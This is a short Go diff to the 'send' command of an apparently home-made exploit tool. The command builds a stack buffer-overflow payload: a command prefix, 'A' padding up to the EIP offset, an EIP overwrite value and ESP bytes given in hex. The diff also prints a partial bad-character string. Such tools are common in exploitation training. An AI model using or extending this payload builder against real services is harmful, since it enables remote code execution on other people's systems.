@@ -23,7 +23,7 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var eip string
+var eip []byte
 var eipAddr int
 var esp []byte
 var h = "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" +
@@ -46,9 +46,10 @@ var sendCmd = &cobra.Command{
 		garbage := strings.Repeat("A", eipAddr)
 		fmt.Println("Len of garbage: ", len(garbage))
 		fmt.Println("Len of eip: ", len(eip))
-		fmt.Println("EIP: ", eip)
-
-		payload := append([]byte(command), []byte(garbage + eip)[:]...)
+		fmt.Printf("EIP in hex: %x\n", eip)
+		fmt.Printf("ESP in hex: %x\n", esp)
+		payload := []byte(command + garbage)
+		payload = append(payload, eip[:]...)
 		payload = append(payload, esp[:]...)
 
 		if err := webfuzz.SendPayload(
@@ -64,7 +65,7 @@ var sendCmd = &cobra.Command{
 
 func init() {
 	rootCmd.AddCommand(sendCmd)
-	sendCmd.Flags().StringVar(&eip, "eip", "", "The value to overwrite EIP")
+	sendCmd.Flags().BytesHexVar(&eip, "eip", nil, "The value to overwrite EIP")
 	sendCmd.Flags().IntVarP(&eipAddr, "eip-address", "a", 0, "starting address of EIP")
 	sendCmd.Flags().BytesHexVar(&esp, "esp", nil, "The value to send to the stack starting at address esp")
 
